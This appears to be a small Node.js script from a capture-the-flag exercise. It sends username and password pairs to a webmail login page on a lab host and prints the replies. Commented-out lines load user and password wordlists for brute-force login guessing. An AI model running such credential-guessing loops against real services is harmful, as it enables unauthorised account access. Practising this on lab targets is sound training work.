const request = require("request");
const fs = require('fs');

/*
const users = ['none'].concat(fs.readFileSync('./../media/users.txt').toString().split("\n"));
const pass = ['none'].concat(fs.readFileSync('./../media/pass.txt').toString().split("\n"));
*/


const users = ["one", "two"];
const pass = users;
console.log(users);



users.forEach((user, index) => {
    request.post("http://mail.neurosoft.ctf/?_task=login", { form: {
        user, password: pass[index]
    }}, (err, res) => {
        console.log("ONE RESPONSE");
        console.log(res.body.split("\n"));
    })
})